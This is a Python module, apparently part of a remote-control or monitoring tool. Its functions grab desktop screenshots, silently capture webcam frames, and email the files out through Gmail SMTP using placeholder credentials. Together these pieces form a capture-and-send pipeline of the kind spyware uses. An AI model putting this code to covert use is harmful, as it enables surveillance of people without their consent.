from PIL import ImageGrab
from datetime import datetime
import email, smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import cv2


GMAIL = "email@gmail.com"
PASSWORD = "pw"
SMTP_HOST = 'smtp.gmail.com'

def screenshot():
    img = ImageGrab.grab()
    path = ".\data\screenshot"+ datetime.now().strftime("_%Y%m%d_%H%M%S") +".jpg"
    img.save(path)
    return path

def webcamshot():
    # initialize the camera
    cam = cv2.VideoCapture(0)   # 0 -> index of camera
    s, img = cam.read()
    if s:    # frame captured without any errors 

        '''#Show captured image on server screen
        cv2.namedWindow("Press any key to exit ...")
        cv2.imshow("Press any key to exit ...",img)
        cv2.waitKey(0)
        cv2.destroyWindow("Press any key to exit ...")'''

        filepath = ".\data\webcamshot{}.jpg".format(datetime.now().strftime("_%Y%m%d_%H%M%S"))
        cv2.imwrite(filepath,img)
        return filepath

class MailSender:
    def __init__(self) -> None:
        self.server =  smtplib.SMTP_SSL(host=SMTP_HOST, port=smtplib.SMTP_SSL_PORT, timeout=None)
        self.server.login(GMAIL, PASSWORD)
        
    def send_plaintext_email(self, receiver, sbj, msg):
        message = f"""\
        Subject: {sbj}

        {msg}"""
        self.server.sendmail(from_addr=GMAIL, to_addrs=receiver, msg=message)

    def send_attached_email(self, receiver, sbj, msg, file_path=None):
        # Create a multipart message and set headers
        message = MIMEMultipart()
        message["From"] = GMAIL
        message["To"] = receiver
        message["Subject"] = sbj

        # Add body to email
        message.attach(MIMEText(msg, "plain"))

        if not isinstance(file_path, type(None)):
            # Open PDF file in binary mode
            with open(file_path, "rb") as attachment:
                # Add file as application/octet-stream
                # Email client can usually download this automatically as attachment
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            # Encode file in ASCII characters to send by email    
            encoders.encode_base64(part)

            filename = os.path.basename(file_path)
            # Add header as key/value pair to attachment part
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {filename}",
            )

            # Add attachment to message and convert message to string
            message.attach(part)
        text = message.as_string()

        # Send email
        self.server.sendmail(from_addr=GMAIL, to_addrs=receiver, msg=text)

